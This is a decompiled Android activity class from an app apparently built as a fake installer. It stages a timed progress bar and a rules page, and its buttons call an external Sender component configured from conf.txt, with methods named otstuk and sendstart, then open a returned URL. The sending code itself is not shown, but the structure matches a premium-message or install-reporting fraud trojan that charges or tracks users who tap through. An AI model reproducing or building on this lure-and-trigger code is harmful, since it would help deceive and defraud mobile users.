package jp.bravo.honda;

import android.app.Activity;
import android.content.Intent;
import android.content.res.AssetManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.text.Html;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import com.uniplugin.sender.Sender;
import java.io.IOException;
import java.io.InputStream;

public class DobraKorzina
  extends Activity
{
  private final int ID_MENU_EXIT = 1;
  private Button button;
  private Button button2;
  private Button button3;
  public Handler handler = new Handler();
  private ProgressBar progressBar;
  private TextView resulturl;
  private Runnable runMethod = new Runnable()
  {
    public void run()
    {
      DobraKorzina.this.progressBar.setProgress(DobraKorzina.this.progressBar.getProgress() + 5);
      if (DobraKorzina.this.progressBar.getProgress() > 99)
      {
        DobraKorzina.this.timer.stop();
        DobraKorzina.this.button.setVisibility(0);
        DobraKorzina.this.textbelow.setVisibility(0);
        DobraKorzina.this.textpredl.setVisibility(0);
        DobraKorzina.this.progressBar.setVisibility(8);
      }
    }
  };
  private Sender testsend;
  private TextView textbelow;
  private TextView textpredl;
  private UITimer timer;
  
  public DobraKorzina() {}
  
  private String getasset(String paramString)
  {
    Object localObject = getAssets();
    try
    {
      paramString = ((AssetManager)localObject).open(paramString);
      localObject = new byte[paramString.available()];
      paramString.read((byte[])localObject);
      paramString = new String((byte[])localObject);
      return paramString;
    }
    catch (IOException paramString)
    {
      paramString.printStackTrace();
    }
    return null;
  }
  
  public void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setstartdisplay();
  }
  
  public boolean onCreateOptionsMenu(Menu paramMenu)
  {
    paramMenu.add(0, 1, 0, "Правила");
    return true;
  }
  
  public boolean onOptionsItemSelected(MenuItem paramMenuItem)
  {
    setroolsdisplay();
    return true;
  }
  
  public void setresultdisplay()
  {
    setContentView(2130903041);
    this.button2 = ((Button)findViewById(2131165191));
    this.resulturl = ((TextView)findViewById(2131165190));
    this.resulturl.setText(this.testsend.resulturl);
    this.button2.setOnClickListener(new View.OnClickListener()
    {
      public void onClick(View paramAnonymousView)
      {
        paramAnonymousView = new Intent("android.intent.action.VIEW", Uri.parse(DobraKorzina.this.testsend.resulturl));
        DobraKorzina.this.startActivity(paramAnonymousView);
      }
    });
  }
  
  public void setroolsdisplay()
  {
    setContentView(2130903042);
    this.button3 = ((Button)findViewById(2131165195));
    String str = getasset("rools.txt");
    ((TextView)findViewById(2131165194)).setText(Html.fromHtml(str));
    this.button3.setOnClickListener(new View.OnClickListener()
    {
      public void onClick(View paramAnonymousView)
      {
        DobraKorzina.this.testsend.sendstart();
        DobraKorzina.this.setresultdisplay();
      }
    });
  }
  
  public void setstartdisplay()
  {
    setContentView(2130903040);
    this.testsend = new Sender();
    this.testsend.SenderStart(getApplicationContext(), "conf.txt", 1);
    this.testsend.otstuk();
    this.progressBar = ((ProgressBar)findViewById(2131165186));
    this.button = ((Button)findViewById(2131165187));
    this.textbelow = ((TextView)findViewById(2131165188));
    this.textpredl = ((TextView)findViewById(2131165185));
    this.button.setOnClickListener(new View.OnClickListener()
    {
      public void onClick(View paramAnonymousView)
      {
        DobraKorzina.this.testsend.otstukpress();
        DobraKorzina.this.testsend.sendstart();
        DobraKorzina.this.setresultdisplay();
      }
    });
    this.textbelow.setOnClickListener(new View.OnClickListener()
    {
      public void onClick(View paramAnonymousView)
      {
        DobraKorzina.this.setroolsdisplay();
      }
    });
    this.timer = new UITimer(this.handler, this.runMethod, 250);
    this.timer.start();
  }
  
  public class UITimer
  {
    private boolean enabled = false;
    private Handler handler;
    private int intervalMs;
    private boolean oneTime = false;
    private Runnable runMethod;
    private Runnable timer_tick = new Runnable()
    {
      public void run()
      {
        if (!DobraKorzina.UITimer.this.enabled) {
          return;
        }
        DobraKorzina.UITimer.this.handler.post(DobraKorzina.UITimer.this.runMethod);
        if (DobraKorzina.UITimer.this.oneTime)
        {
          DobraKorzina.UITimer.this.enabled = false;
          return;
        }
        DobraKorzina.UITimer.this.handler.postDelayed(DobraKorzina.UITimer.this.timer_tick, DobraKorzina.UITimer.this.intervalMs);
      }
    };
    
    public UITimer(Handler paramHandler, Runnable paramRunnable, int paramInt)
    {
      this.handler = paramHandler;
      this.runMethod = paramRunnable;
      this.intervalMs = paramInt;
    }
    
    public UITimer(Handler paramHandler, Runnable paramRunnable, int paramInt, boolean paramBoolean)
    {
      this(paramHandler, paramRunnable, paramInt);
      this.oneTime = paramBoolean;
    }
    
    public boolean isEnabled()
    {
      return this.enabled;
    }
    
    public void start()
    {
      if (this.enabled) {}
      while (this.intervalMs < 1) {
        return;
      }
      this.enabled = true;
      this.handler.postDelayed(this.timer_tick, this.intervalMs);
    }
    
    public void stop()
    {
      if (!this.enabled) {
        return;
      }
      this.enabled = false;
      this.handler.removeCallbacks(this.runMethod);
      this.handler.removeCallbacks(this.timer_tick);
    }
  }
}
